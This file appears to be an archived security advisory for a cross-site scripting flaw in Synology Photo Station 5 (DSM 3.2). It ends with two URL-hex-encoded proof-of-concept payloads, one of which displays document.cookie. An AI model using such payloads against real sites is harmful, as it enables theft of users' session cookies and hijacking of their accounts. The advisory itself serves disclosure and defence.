@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/52416/info
+
+Synology Photo Station is prone to a cross-site scripting vulnerability because it fails to sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+Photo Station 5 DSM 3.2 (1955) is vulnerable; other versions may also be affected. 
+
+http://www.example.com/photo/photo_one.php?name=494d475f32303131303730395f3232343432362e6a7067&dir=6970686f6e65207068696c69707065&name=%22%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29%29%3c%2f%73%63%72%69%70%74%3e
+
+http://www.example.com/photo/photo_one.php?name=494d475f32303131303730395f3232343432362e6a7067&dir=6970686f6e65207068696c69707065&name=%22%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3c%2f%73%63%72%69%70%74%3e%3c%61%20%68%72%65%66%3d%22 
